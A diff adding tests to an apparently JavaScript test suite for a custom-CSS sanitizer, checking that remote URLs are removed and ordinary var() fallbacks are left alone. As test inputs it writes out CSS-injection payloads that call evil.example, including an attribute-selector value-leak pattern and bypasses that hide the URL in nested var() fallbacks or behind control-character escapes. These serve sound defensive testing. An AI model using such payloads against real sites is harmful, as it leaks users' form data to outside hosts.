@@ -254,6 +254,51 @@ describe("custom CSS may not reach off this origin", () => {
     ).not.toContain("evil.example");
   });
 
+  it("reads a URL out of a var() fallback", () => {
+    // css-tree puts a `var()` fallback in a nested `Raw`, so a check that only
+    // re-parsed the value's ROOT missed it — and the browser substitutes the
+    // fallback in and makes the request.
+    const out = sanitizeCustomCss(
+      `input[value^="a"] { background: var(--missing, url("https://evil.example/a")) }`,
+      SCOPE
+    );
+    expect(out.css).not.toContain("evil.example");
+    expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    // Nested one level further, since the re-parse recurses.
+    expect(
+      sanitizeCustomCss(
+        `.a { background: var(--x, var(--y, url("https://evil.example/a"))) }`,
+        SCOPE
+      ).css
+    ).not.toContain("evil.example");
+  });
+
+  it("leaves an ordinary fallback alone", () => {
+    // The other side: most fallbacks are values, not URLs, and refusing them
+    // would break the commonest use of `var()` there is.
+    for (const css of [
+      `.a { background: var(--bg, #fff) }`,
+      `.a { color: var(--c, red) }`,
+      `.a { --gap: 12px; padding: var(--gap) }`,
+    ]) {
+      expect(sanitizeCustomCss(css, SCOPE).warnings).toEqual([]);
+    }
+  });
+
+  it("strips the leading controls a URL parser strips", () => {
+    // "Remove any leading and trailing C0 control or space from input" — C0 is
+    // U+0000 to U+001F, and `trim()` does not cover it, so a scheme behind
+    // U+0001 survived while resolving to the same host.
+    for (const escape of ["\\1 ", "\\8 ", "\\1f "]) {
+      const out = sanitizeCustomCss(
+        `.a { background: url("${escape}https://evil.example/a") }`,
+        SCOPE
+      );
+      expect(out.css).not.toContain("evil.example");
+      expect(out.warnings.map(w => w.code)).toContain("remote-url");
+    }
+  });
+
   it("removes the whitespace a URL parser removes", () => {
     // Tab and newline are stripped OUT of a URL by the parser, so `h<TAB>ttps:`
     // is fetched as `https:` while matching no scheme pattern.
